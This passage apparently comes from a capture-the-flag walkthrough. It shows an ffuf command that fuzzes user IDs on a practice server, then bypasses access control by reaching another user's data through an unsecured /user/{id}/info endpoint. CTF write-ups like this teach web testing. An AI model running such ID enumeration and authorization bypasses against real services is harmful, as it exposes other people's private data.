We know the user ID 27 exists but maybe we can view other user ID's?

Run the below command which will search for other user ID's between 1-100

seq 1 100 | ffuf -w - -t 1 -p 0.1 -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnpPRzV3ZG1VMGFpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJmMmZlZjI5MWI5ZjJlNWE1YjRkMjBjZTgwNzRlZTY1ZCJ9" -u http://server.vulnbegin.co.uk/user/FUZZ -mc all -fc 404

The above command has found user ID's 5 and 27. 27 is obviously ours but 5 is a new one lets try looking at the /user/5 endpoint to see what is being displayed.

Okay so this has resulted in displaying an error that we don't have permission to view this user. But we know from before there is a /user/{id}/info endpoint and sometimes other endpoints are not secured in the same way.

Brilliant, this has given us user information for user ID 5 and also the last flag
